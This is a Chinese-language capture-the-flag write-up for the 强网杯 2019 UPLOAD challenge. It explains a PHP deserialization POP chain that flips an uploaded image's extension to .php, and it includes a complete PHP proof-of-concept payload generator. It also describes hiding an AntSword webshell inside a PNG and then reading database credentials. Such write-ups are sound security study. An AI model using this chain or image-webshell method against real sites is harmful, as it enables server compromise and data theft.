# \[强网杯 2019] UPLOAD

## \[强网杯 2019] UPLOAD

## 考点

*

## wp

https://www.zhaoj.in/read-5873.html

### 分析

1. 只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下
2. 本题是 www.tar.gz 泄露，源码泄露总结
3. 函数流程：
   1. 没有登陆时，跳转到 index.php，进行注册登陆。login\_check 函数将 cookie('user') 赋给 profile，然后 base64 解码反序列化
   2. 在注册页面调用 login\_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册
   3. 在登陆页面调用 login\_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆
   4. 已经登陆时，跳转到 index.php/home 进行文件上传操作
   5. 在进行上传操作时，对请求头中的 REMOTE\_ADDR 进行 md5 加密并赋给 upload\_menu ，然后创建以 upload\_menu 命名的文件夹
   6. 然后进行登陆检查，然后将文件的临时副本的名称赋给 filename\_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename
   7. 然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0
   8. 如果后缀是 png，检查图片内容，然后将 filename 赋给 filename\_tmp，将图片相对路径赋给 img，执行 update\_img 函数
   9. update\_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update\_cookie 函数
   10. update\_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user
   11. profile 的 \_call 和 \_get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。\_\_get 会直接从 except 里找，\_\_call 会调用自身的 name 成员变量所指代的变量所指代的方法。

## 攻击流程

注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图

![](https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb\_upload\_1.png)

解码后如图

![](https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb\_upload\_2.png)

选择上传图片，这个图片就是合成的图片马，从 [阿里巴巴矢量图库](https://www.iconfont.cn) 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error

上传图片之后，会在 upload 目录下生成一个 md5(REMOTE\_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie\['user'] 如图

![](https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb\_upload\_3.png)

解码后如图

![](https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb\_upload\_4.png)

使用 poc 生成的序列化结果修改 cookie\['user']，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 \_\_get 函数中定义了如果调用 index() 就去调用 img，而 \_\_call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload\_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。

最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag

最终 poc 如下，修改上传图片地址即可

```php
<?php
namespace app\web\controller;

class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}

$profile = new Profile();
$profile->except = ['index' => 'img'];
$profile->img = "upload_img";
$profile->ext = "png";
//修改地址即可
$profile->filename_tmp = "../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png";
$profile->filename = "../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php";

$register = new Register();
$register->registed = false;
$register->checker = $profile;

echo urlencode(base64_encode(serialize($register)));
?>
```



> mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效
>
> copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy("./1.png", "./1.php" ) 执行之后会存在两个文件 1.png 和 1.php
>
> unlink(a)，a 是文件路径，删除文件 a
